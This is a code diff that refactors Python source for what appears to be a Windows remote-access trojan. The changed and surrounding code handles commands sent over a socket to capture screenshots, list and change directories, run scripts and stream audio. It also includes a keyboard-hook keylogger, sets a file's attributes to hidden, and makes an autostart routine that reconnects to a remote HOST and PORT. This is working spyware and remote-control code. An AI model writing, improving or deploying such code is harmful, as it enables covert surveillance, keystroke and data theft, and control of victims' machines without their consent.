@@ -246,6 +246,32 @@ def set_content_attribute(filepath):
         Kernel32.SetFileAttributesW(filepath, 2)
 
 
+def get_screenshot():
+    return str({
+        'width': width,
+        'height': height,
+        'screenshotbits': screen_bits()
+    })
+
+
+def ls():
+    string = {
+        'path': os.getcwdu()
+    }
+    try:
+        for n, i in enumerate(os.listdir(u'.')):
+            string[str(n)] = {
+                'name': i,
+                'type': os.path.isfile(i),
+                'size': os.path.getsize(i),
+                'modified': time.ctime(os.path.getmtime(i)),
+                'hidden': has_hidden_attribute(i)
+            }
+        return str(string)
+    except WindowsError:
+        return 'windowsError'
+
+
 def get_window_title():
     get_foreground_window = User32.GetForegroundWindow
     get_window_text_length = User32.GetWindowTextLengthW
@@ -304,35 +330,19 @@ class ChildSocket(threading.Thread):
                         pass
                     stdoutput = 'audioStopped'
                 elif data.startswith('getScreenshot'):
-                    stdoutput = str({
-                        'width': width,
-                        'height': height,
-                        'screenshotbits': screen_bits()
-                    })
+                    stdoutput = get_screenshot()
                 elif data.startswith("cd"):
                     try:
                         os.chdir(data[3:])
                         stdoutput = ""
                     except:
                         stdoutput = "Error opening directory"
-                elif data.startswith(("Activate")):
+                elif data.startswith('Activate'):
                     stdoutput = ''
-                elif data.startswith("runscript "):
+                elif data.startswith('runscript '):
                     stdoutput = execute(data[10:])
-                elif data.startswith("ls"):
-                    string = {}
-                    try:
-                        for n, i in enumerate(os.listdir(u'.')):
-                            string[n] = {}
-                            string[n]['name'] = i
-                            string[n]['type'] = os.path.isfile(i)
-                            string[n]['size'] = os.path.getsize(i)
-                            string[n]['modified'] = time.ctime(os.path.getmtime(i))
-                            string[n]['hidden'] = has_hidden_attribute(i)
-                        string['path'] = os.getcwdu()
-                        stdoutput = str(string)
-                    except WindowsError:
-                        stdoutput = 'Access is denied'
+                elif data.startswith('ls'):
+                    stdoutput = ls()
                 elif data.startswith('myinfo'):
                     stdoutput = self.mode + ' ' + self.id
                 else:
@@ -340,6 +350,7 @@ class ChildSocket(threading.Thread):
                 send(self.socket, stdoutput, mode)
             except socket.error:
                 return
+
 
 class AudioStreaming(threading.Thread):
     def __init__(self, sock, rate):
@@ -409,14 +420,12 @@ class Key(threading.Thread):
         if keycodes.has_key(l_param[0]):
             key = keycodes[l_param[0]]
         else:
-            # Capslock ON
             if User32.GetKeyState(0x14) & 1:
                 if User32.GetKeyState(0x10) & 0x8000:
                     key = shiftcodes[l_param[0]] if shiftcodes.has_key(l_param[0]) else update_key(
                         l_param[0]).lower()
                 else:
                     key = update_key(l_param[0]).upper()
-            # Capslock OFF
             else:
                 if User32.GetKeyState(0x10) & 0x8000:
                     key = shiftcodes[l_param[0]] if shiftcodes.has_key(l_param[0]) else update_key(
@@ -438,10 +447,11 @@ class Key(threading.Thread):
             pass
         self.start_keylogger()
 
-def start_child_socket(id, mode):
-    socketsBank[id] = ChildSocket(id, mode)
-    socketsBank[id].start()
-    return id
+
+def start_child_socket(id_, mode):
+    socketsBank[id_] = ChildSocket(id_, mode)
+    socketsBank[id_].start()
+    return id_
 
 
 def from_autostart():
@@ -452,7 +462,6 @@ def from_autostart():
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((HOST, PORT))
         except:
-            s.close()
             active = False
             time.sleep(5)
             continue
